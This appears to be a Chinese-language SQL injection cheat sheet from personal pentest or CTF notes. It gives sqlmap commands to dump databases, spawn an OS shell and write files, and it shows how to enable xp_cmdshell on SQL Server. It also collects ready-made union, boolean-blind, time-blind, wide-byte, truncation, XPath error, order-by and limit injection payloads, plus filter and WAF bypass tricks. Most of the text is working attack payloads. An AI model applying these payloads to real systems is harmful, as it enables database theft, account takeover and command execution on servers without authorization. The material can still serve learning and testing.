---
sort: 2
---

{% raw  %}

# SQL 注入

## 1. sqlmap

### 1.1 GET 注入法：

```
sqlmap -u [url]
```

### 1.2 POST 注入法：

- 首先使用 BP 抓包，将数据保存到一个文件中，如 log.txt
- 使用命令: `sqlmap -r log.txt --dbs`, 即可爆库
- 爆表名: `sqlmap -r log.txt --table -D [database name]`
- 爆列名: `sqlmap -r log.txt --columns -D [database name] -T [table name]`
- 爆数据: `sqlmap -r log.txt --dump -D [database name] -T [table name] -C [column name]`

### 1.3 已知数据库密码时的一些操作

```
sqlmap "mysql://root:root@127.0.0.1/<dbname>" --os-shell  # sqlmap getshell
sqlmap "mysql://root:root@127.0.0.1/<dbname>" --file-write <lcoal file> --file-dest <upload file> # 上传文件
```

### 1.4 sql server 开启 cmd shell

```
EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO

EXEC sp_configure 'xp_cmdshell',1
GO
RECONFIGURE
GO

EXEC master..xp_cmdshell 'whoami'
```

### 1.4 mssql 开启

## 2. 手工注入

- (1) 发现注入点：尝试在数据输入尾部添加', #, --等内容, 如果数据库报错说明存在注入点.
- (2) 使用 order by 1(数字任意)尝试出字段数, 当 order by n 恰好报错时, 则字段数为 n-1. **使用联合查询前必须试探出字段个数!!!**
- (3) 使用联合查询试探可查询字段数: union select 1,2,3,4,5#
  > 作用: 假定可查询字段数为 n, 则在探查数据库信息使用联合查询时, 必须将查询内容凑够 n 个
- (4) 判断数据库信息:
  - 利用内置函数暴数据库信息 : version()版本；database()数据库；user()用户；
  - 不用猜解可用字段暴数据库信息(有些网站不适用):

```sql
        and 1=2 union all select version()
        and 1=2 union all select database()
        and 1=2 union all select user()
        # 操作系统信息：
        and 1=2 union all select @@global.version_compile_os from mysql.user
        # 数据库权限：
        and ord(mid(user(),1,1))=114 # 返回正常说明为root
        # Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息:
        union select information_schema from information_schema.schemata
```

- (5) 爆破数据表个数：

```sql
and (select count(table_name) from information_schema.tables where table_schema=database())=2
```

- (6) 查找数据表名：

```sql
union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())
```

- (7) 查找列名:

```sql
union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=[table_name])
当列名被waf过滤时, 使用其进行ascii编码
```

- (8) 获取数据:

```sql
union select [column_name] from [table_name]
```

## 3. 基于布尔的盲注

- (1)获取数据库库名长度:

```sql
id=1' and length(database())='1
```

- (2). 获取数据库名:

```sql
id=1' and substr(database(), 0, 1)='a
```

- (3). 获取数据表表名:

```sql
id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='a' and '1'='1
```

- (4). 获取列名:

```sql
id=1' and substr((select group_concat(column_name) from information_schema.columns where table_name=[table_name]),1,1)='a' and '1'='1
```

## 4. 基于时间的盲注

使用 sleep+if 的方式试探字符串, 例如:

```sql
1' and if( substr((select database()), 1, 0)='a', sleep(1), 0)
```

使用 python 时, 使用 requests.total_second()获取响应时间而不是 timeout

## 5. 宽字节注入

- 原理：当数据库使用**gbk 编码**(前提), 当数据库过滤单引号(')为(\')时, 使用%df'去注入, 例如:

```sql
id=1%df' and '1'='2'
```

服务器会将`'`转义为`\'`<=====>`%5c%27`  
因此注入`%df'` <=====> `%df%5c%27` <=======> `id=1(一个gbk编码汉字)'`注入成功

## 6. insert 注入

### 6.1 sql 约束攻击

- 前提：假设一数据库中存在字段 username 和 password, 其定义长度为 n 和 m, 则当插入数据长度大于 n(m)时, 只会截取前 n(m)位;6.
- 利用： 当数据库中存在一个确定的 username 时, 如 admin, 若插入 admin[n 个空格]1 则只会截取前 n 位, 又因为 mysql 在执行 mysql_real_escape_string()时会忽略空格, 因此实际上插入的数据名为 admin, 代码:

```sql
INSERT INTO user(username, password)
VAULE('admin                            1', '123456')
```

### 6.2 case when 注入

在语句`insert into tablename('id') value ('$a');`中, 可以构造:

```php
$a = "1' and case when 1 then sleep(5) else 0 end and '1'='1.";
```

这个也可以绕过 if 过滤.

## 7. SQL 注入过滤的绕过姿势

- 1.若发现有关键字过滤, 尝试:
  - 1).使用重写术绕过过滤, 例如`selselectect`
  - 2).大小写绕过, 例如`UniOn`
  - 3).注释绕过, 例如`uni/**/on`
  - 4).
- 2.使用异或注入法检测是否过滤, 例如 `1' ^ (length('union')!=0)`若为假, 则说明 union 未过滤; 反之被过滤.
- 3.使用 url 编码绕过, 例如将#转义为%23
- 4.若过滤了=号， 使用`!(a<>b)`代替`a==b`, 或使用`like`, 或使用`regex binary`
- 5.若过滤了空格，使用注释代替空格:` /**/`, 或使用括号代替空格, 或使用回车 0x0a 代替
- 6.逗号过滤:
  - `substr`函数中, 可以使用`from for`代替逗号
  - `limit 0,1`等同于`limit 1 offset 0`
- 7.引号过滤: 需要两处输入点, 例如在形如如下查询语句中:

```
select * from user where username='admin' and password='password';
```

可以在 username 中输入`admin\`, 则原生的单引号会被转义, 输入的 password 为我们的 payload, 输入 username 为`admin\`, password 为` or 1=1#`

```
select * from user where username='admin\' and password=' or 1=1#';
```

那么 mysql 在执行时, username 字段变为了`username='admin\' and password='`, 之后的条件语句变为了`or 1=1#`, 此时我们没有输入单引号就造成了注入.

## 8. XPath 报错注入:

- updatexml(): 对 xml 进行查询和修改
- extractvalue(): 对 xml 进行查询和修改
- 用法: `updatexml(XPath_Document, XPath_String, new_value)`, 其中 XPath_String 必须符合 XPath 语法, 否则将会报错.
- 例如: `<sql query> or updatexml(1, concat(0x7e, (select @@version), 0x7e), 1)`将会报错:  
  **ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'**

## 9. order 注入

正常的 SQL 语句:

```sql
select * from users order by id desc;
```

当 desc 字段可控时, 即有可能存在 oreder by 注入。

1. 如果有报错信息输出，可尝试通过报错注入完成 sql 注入攻击
2. 如果没有回显，可尝试盲注的手法来注入

这里的 desc 是可控字符串的话，我们让这条语句变下形：

```sql
select * from users order by id ^0;
```

这样的话，由于 order by 默认是升序排列的，没有 desc 也没有影响，同时，加上了^0 也还是 id 本身，所以跟原来正常的排序没有任何的变化。

```sql
select * from users order by id ^1;
```

于是我们可以构造盲注 payload

```sql
http://127.0.0.1:8888/?content=&order=id^(select%20if(1=1,%201,%200))
```

## 10. limit 注入

报错回显:

```sql
select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```

延时无回显:

```sql
select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

{% endraw %}
